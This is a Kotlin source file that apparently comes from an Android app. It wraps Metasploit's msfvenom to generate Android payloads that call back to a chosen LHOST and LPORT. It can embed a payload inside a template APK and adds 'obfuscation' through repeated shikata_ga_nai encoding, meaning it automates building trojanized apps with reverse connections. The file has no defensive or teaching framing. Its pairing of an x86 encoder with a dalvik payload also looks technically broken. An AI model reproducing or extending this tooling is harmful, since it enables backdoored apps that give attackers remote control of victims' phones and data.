package com.Azelmods.App.data.security.payload

import android.content.Context
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Wrapper for msfvenom binary execution
 * 
 * Handles:
 * - msfvenom binary path resolution
 * - Command building with obfuscation parameters
 * - Process execution and monitoring
 * - Template APK management
 * 
 * Requirements: 7.1, 7.2, 7.3, 9.1, 9.2, 9.3, 9.4, 28.1, 28.2, 28.3, 28.4
 */
@Singleton
class MsfvenomWrapper @Inject constructor(
    private val context: Context
) {
    
    companion object {
        private const val TAG = "MsfvenomWrapper"
        private const val MSFVENOM_BINARY_NAME = "msfvenom"
        private const val TERMUX_BIN_PATH = "/data/data/com.termux/files/usr/bin"
        private const val COMMAND_TIMEOUT_MS = 300000L // 5 minutes
    }
    
    /**
     * Resolves the path to msfvenom binary
     * 
     * Checks:
     * 1. Termux installation (/data/data/com.termux/files/usr/bin/msfvenom)
     * 2. System PATH
     * 3. Custom installation paths
     * 
     * Requirements: 28.1
     */
    fun resolveMsfvenomPath(): String? {
        // Check Termux installation
        val termuxPath = File(TERMUX_BIN_PATH, MSFVENOM_BINARY_NAME)
        if (termuxPath.exists() && termuxPath.canExecute()) {
            Log.d(TAG, "Found msfvenom in Termux: ${termuxPath.absolutePath}")
            return termuxPath.absolutePath
        }
        
        // Check system PATH
        try {
            val process = Runtime.getRuntime().exec(arrayOf("which", MSFVENOM_BINARY_NAME))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val path = reader.readLine()
            reader.close()
            process.waitFor()
            
            if (path != null && File(path).exists()) {
                Log.d(TAG, "Found msfvenom in PATH: $path")
                return path
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error checking PATH for msfvenom", e)
        }
        
        Log.e(TAG, "msfvenom binary not found")
        return null
    }
    
    /**
     * Checks if msfvenom is available
     */
    fun isMsfvenomAvailable(): Boolean {
        return resolveMsfvenomPath() != null
    }
    
    /**
     * Builds msfvenom command with obfuscation parameters
     * 
     * Requirements: 7.1, 7.2, 7.3, 9.1, 9.2, 9.3, 9.4, 28.2
     */
    fun buildMsfvenomCommand(
        config: PayloadConfig,
        outputPath: String
    ): List<String> {
        val msfvenomPath = resolveMsfvenomPath()
            ?: throw IllegalStateException("msfvenom binary not found")
        
        val command = mutableListOf(
            msfvenomPath,
            "-p", config.type.msfvenomName,
            "LHOST=${config.lhost}",
            "LPORT=${config.lport}",
            "-o", outputPath
        )
        
        // Add platform
        command.add("--platform")
        command.add("android")
        
        // Add architecture
        command.add("--arch")
        command.add("dalvik")
        
        // Add format
        command.add("-f")
        command.add("raw")
        
        // Add template APK if provided
        if (config.templateApkPath != null && File(config.templateApkPath).exists()) {
            command.add("-x")
            command.add(config.templateApkPath)
            Log.d(TAG, "Using template APK: ${config.templateApkPath}")
        }
        
        // Add encoding based on obfuscation level
        if (config.obfuscationLevel != ObfuscationLevel.NONE) {
            val iterations = config.obfuscationLevel.encodingIterations
            
            // Use shikata_ga_nai encoder (polymorphic XOR additive feedback encoder)
            command.add("-e")
            command.add("x86/shikata_ga_nai")
            command.add("-i")
            command.add(iterations.toString())
            
            Log.d(TAG, "Added encoding: shikata_ga_nai with $iterations iterations")
        }
        
        Log.d(TAG, "Built msfvenom command: ${command.joinToString(" ")}")
        return command
    }
    
    /**
     * Executes msfvenom command with progress monitoring
     * 
     * Requirements: 7.3, 28.3, 28.4
     */
    suspend fun executeCommand(
        command: List<String>,
        onProgress: (Int, String) -> Unit
    ): ExecutionResult = withContext(Dispatchers.IO) {
        try {
            Log.d(TAG, "Executing command: ${command.joinToString(" ")}")
            
            val processBuilder = ProcessBuilder(command)
            processBuilder.redirectErrorStream(true)
            
            val process = processBuilder.start()
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            
            var line: String?
            var progress = 0
            val maxProgress = 90 // Reserve 10% for post-processing
            
            onProgress(0, "Starting payload generation...")
            
            while (reader.readLine().also { line = it } != null) {
                Log.d(TAG, "msfvenom output: $line")
                
                // Parse progress from output
                line?.let { output ->
                    when {
                        output.contains("Attempting to read payload", ignoreCase = true) -> {
                            progress = 10
                            onProgress(progress, "Reading payload template...")
                        }
                        output.contains("Generating payload", ignoreCase = true) -> {
                            progress = 30
                            onProgress(progress, "Generating payload...")
                        }
                        output.contains("Encoding", ignoreCase = true) -> {
                            progress = 50
                            onProgress(progress, "Encoding payload...")
                        }
                        output.contains("Iteration", ignoreCase = true) -> {
                            // Extract iteration number if possible
                            val iterMatch = Regex("""Iteration (\d+)""").find(output)
                            if (iterMatch != null) {
                                val iter = iterMatch.groupValues[1].toIntOrNull() ?: 0
                                progress = 50 + (iter * 5).coerceAtMost(30)
                                onProgress(progress, "Encoding iteration $iter...")
                            }
                        }
                        output.contains("Payload size", ignoreCase = true) -> {
                            progress = 80
                            onProgress(progress, "Finalizing payload...")
                        }
                    }
                }
            }
            
            val exitCode = process.waitFor()
            reader.close()
            
            if (exitCode == 0) {
                onProgress(maxProgress, "Payload generated successfully")
                ExecutionResult.Success
            } else {
                ExecutionResult.Error("msfvenom exited with code $exitCode")
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error executing msfvenom command", e)
            ExecutionResult.Error("Failed to execute msfvenom: ${e.message}")
        }
    }
    
    /**
     * Gets template APK path from assets or storage
     * 
     * Requirements: 28.4
     */
    fun getTemplateApkPath(): String? {
        // Check if template APK exists in app's private storage
        val templateDir = File(context.filesDir, "templates")
        if (!templateDir.exists()) {
            templateDir.mkdirs()
        }
        
        val templateApk = File(templateDir, "template.apk")
        
        // If template doesn't exist, try to extract from assets
        if (!templateApk.exists()) {
            try {
                context.assets.open("template.apk").use { input ->
                    templateApk.outputStream().use { output ->
                        input.copyTo(output)
                    }
                }
                Log.d(TAG, "Extracted template APK from assets")
            } catch (e: Exception) {
                Log.w(TAG, "Template APK not found in assets", e)
                return null
            }
        }
        
        return if (templateApk.exists()) {
            templateApk.absolutePath
        } else {
            null
        }
    }
    
    /**
     * Validates that msfvenom binary is executable
     */
    fun validateMsfvenomBinary(): ValidationResult {
        val errors = mutableListOf<ValidationError>()
        
        val msfvenomPath = resolveMsfvenomPath()
        if (msfvenomPath == null) {
            errors.add(
                ValidationError(
                    field = "msfvenom",
                    message = "msfvenom binary not found. Please install Metasploit Framework via Termux."
                )
            )
            return ValidationResult.Invalid(errors)
        }
        
        val msfvenomFile = File(msfvenomPath)
        if (!msfvenomFile.canExecute()) {
            errors.add(
                ValidationError(
                    field = "msfvenom",
                    message = "msfvenom binary is not executable. Check file permissions."
                )
            )
            return ValidationResult.Invalid(errors)
        }
        
        return ValidationResult.Valid
    }
}

/**
 * Result of command execution
 */
sealed class ExecutionResult {
    object Success : ExecutionResult()
    data class Error(val message: String) : ExecutionResult()
}
